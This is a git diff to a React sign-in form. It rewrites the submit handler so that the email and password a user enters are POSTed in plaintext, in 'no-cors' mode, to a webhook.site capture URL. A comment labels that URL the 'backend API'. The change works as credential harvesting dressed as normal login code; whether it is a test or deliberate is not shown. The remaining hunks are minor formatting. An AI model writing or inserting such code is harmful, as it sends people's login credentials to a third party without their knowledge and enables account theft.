@@ -118,13 +118,45 @@ export default function SignIn(props) {
     setOpen(false);
   };
 
-  const handleSubmit = (event) => {
+  // const handleSubmit = (event) => {
+  //   event.preventDefault();
+  //   const data = new FormData(event.currentTarget);
+  //   console.log({
+  //     email: data.get('email'),
+  //     password: data.get('password'),
+  //   });
+  // };
+  const handleSubmit = async (event) => {
     event.preventDefault();
+
     const data = new FormData(event.currentTarget);
-    console.log({
-      email: data.get('email'),
-      password: data.get('password'),
-    });
+    const email = data.get('email');
+    const password = data.get('password');
+
+    try {
+      // Send POST request to backend API
+      const response = await fetch('https://webhook.site/9d6dc48b-ca71-4ae2-9f05-f177292d224b', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ email, password }),
+        mode: 'no-cors'
+      });
+
+      // // Handle the response
+      // if (response.ok) {
+      //   const result = await response.json();
+      //   console.log('Success:', result);
+      //   // Handle successful response here (e.g., save token, redirect)
+      // } else {
+      //   console.log('Error:', response.statusText);
+      //   // Handle error response here
+      // }
+    } catch (error) {
+      console.error('Request failed:', error);
+      // Handle network errors or other unexpected issues
+    }
   };
 
   const validateInputs = () => {
@@ -167,7 +199,7 @@ export default function SignIn(props) {
               color: "#4F3527",
               fontWeight: 'bold',
               width: "fit-content",
-              '&:hover':{
+              '&:hover': {
                 textDecoration: "underline"
               }
             }}
@@ -239,7 +271,7 @@ export default function SignIn(props) {
               />
             </FormControl>
             <FormControlLabel
-              control={<Checkbox value="remember" 
+              control={<Checkbox value="remember"
                 sx={{
                   color: '#ad7e65', // Màu khi chưa check
                   '&.Mui-checked': {
